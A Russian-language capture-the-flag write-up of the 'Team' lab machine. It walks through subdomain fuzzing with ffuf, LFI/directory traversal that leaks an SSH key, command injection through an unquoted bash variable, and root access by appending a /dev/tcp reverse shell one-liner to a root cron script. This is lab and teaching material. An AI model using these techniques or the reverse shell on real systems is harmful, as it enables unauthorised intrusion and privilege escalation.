# Team

### Необходимые навыки

- Фаззинг поддиректорий и поддоменов (ffuf)
- Эксплуатация LFI / Directory Traversal
- Перебор специализированных словарей для LFI
- Эксплуатация command injection через незакавыченную переменную bash
- Работа с cron-задачами для повышения привилегий

---

### Взятие шелла

Начинаю со сканирования портов (masscan, затем nmap). Всё стандартно: SSH, HTTP и FTP без анонимного доступа — последний пока откладываю.

На 80-м порту — заглушка Apache:

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/9a153a73-6d3c-4d40-9737-c2bcc2873916" />

Фаззю поддиректории через ffuf по rockyou.txt с расширениями `.php` и `.html` — пусто. Поддомены тоже молчат. Из безнадёжности попробовала прописать домен `team.thm` в `/etc/hosts` — и сработало (честно говоря, это больше похоже на угадайку, чем на пентест 🙄). Оказываемся на сайте-витрине, где почти ничего не нажимается. Из кода страницы вытащила пути к изображениям, попробовала перебрать их номера в поисках IDOR (`http://team.thm/images/fulls/01.jpg`) — безрезультатно. Пофаззила поддиректории: `robots.txt` пустой, `/scripts` и `/assets` возвращают 403.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/aa713d58-262a-488c-b18b-83c9564ad3ad" />

Попробовала HTTP verb tampering с нестандартными методами — тоже пусто. Решила пофаззить поддомены:

```
ffuf -u http://team.thm/ -H 'Host: FUZZ.team.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -ic -c -fs 11366
```

И наконец сдвинулись с мёртвой точки:

<img width="600" height="70" alt="image" src="https://github.com/user-attachments/assets/140e9406-fee9-423e-83e7-d7e948a5f811" />

Прописываю `dev.team.thm` в `/etc/hosts`, перехожу на сайт — и вижу учебниковую LFI прямо в URL:

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/c58e98a3-9dbc-488b-8d8a-bfa3ff192d57" />

Пробую directory traversal — работает, читаем системные файлы. Из `/etc/passwd` узнаю пользователей, пробую прочитать их приватные SSH-ключи (`../../home/gyles/.ssh/id_rsa`) — страница ничем не отвечает.

<img width="600" height="150" alt="image" src="https://github.com/user-attachments/assets/5baa2886-9f04-463f-adcc-9542337df538" />

Далее попробовала log poisoning через `/var/log/apache2/access.log` — не читается. Session poisoning тоже не вышло: создала куку `PHPSESSID` и проверила `/var/lib/php/sessions/sess_*` — файл сессии не создался. Раз стандартные векторы не сработали, фаззю LFI специализированным словарём:

```
ffuf -u http://dev.team.thm/script.php?page=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -ic -c -fs 1,2203
```

Перебирая доступные файлы, нахожу приватный SSH-ключ прямо в `sshd_config`:

<img width="600" height="456" alt="image" src="https://github.com/user-attachments/assets/4ec6f0f6-7ec9-47bc-bc09-5666ba15b28e" />

Копирую ключ в файл, выставляю нужные права (`chmod 700 ssh`) и подключаюсь за одного из пользователей, найденных в `/etc/passwd`. Забираю первый флаг:

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/a9bf7725-2bd5-4da7-8790-6be46e79f89d" />

---

### Повышение привилегий до root

Сразу признаюсь: машина лёгкая, поэтому глубокую разведку не делала и просто следовала очевидным намёкам автора.

Первым делом проверяю `sudo -l` — можно без пароля запускать некий файл от имени `gyles`. Значит, план такой: сначала берём gyles, через него — root.

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/31572b55-987e-48e7-bfc8-169b33690432" />

Смотрю скрипт и замечаю переменную `$error` без кавычек. В bash незакавыченная переменная в команде вроде `eval $error` или `$error` в нужном контексте заставляет интерпретатор разбить строку на слова: первое трактуется как команда, остальные — как её аргументы. Это открывает возможность для command injection.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/690e135c-102e-48c3-89ca-ef08f517be52" />

Запускаю скрипт от имени gyles (`sudo -u gyles ./admin_checks`) и через инъекцию получаю его оболочку:

<img width="600" height="52" alt="image" src="https://github.com/user-attachments/assets/21b72aa0-4361-4ae3-9efb-acd0d0d4dffe" />

Команда `id` показывает, что gyles состоит в группе `admin` — у dale её не было. Ищу файлы, где владелец — root, а группа с правами записи — `admin`:

```bash
find / -group admin -writable 2>/dev/null
```

<img width="600" height="191" alt="image" src="https://github.com/user-attachments/assets/5a003236-d2e1-4997-9591-03d7f3606c85" />

Нахожу файл `main_backup.sh`. Судя по названию — скрипт бэкапа. Проверяю `/var/backups/www/team.thm`:

<img width="600" height="194" alt="image" src="https://github.com/user-attachments/assets/3999b551-80d1-43b0-bee4-4bb779375f17" />

Последний бэкап был минуту назад — значит, скрипт запускается по cron от имени root. Добавляю в конец `main_backup.sh` reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/your_ip/5555 0>&1"
```

Открываю listener на своей машине, жду следующего запуска крона — и ловлю root shell:

<img width="600" height="152" alt="image" src="https://github.com/user-attachments/assets/1b29dbd4-c761-45eb-a365-4374392a0b86" />

Второй флаг взят.
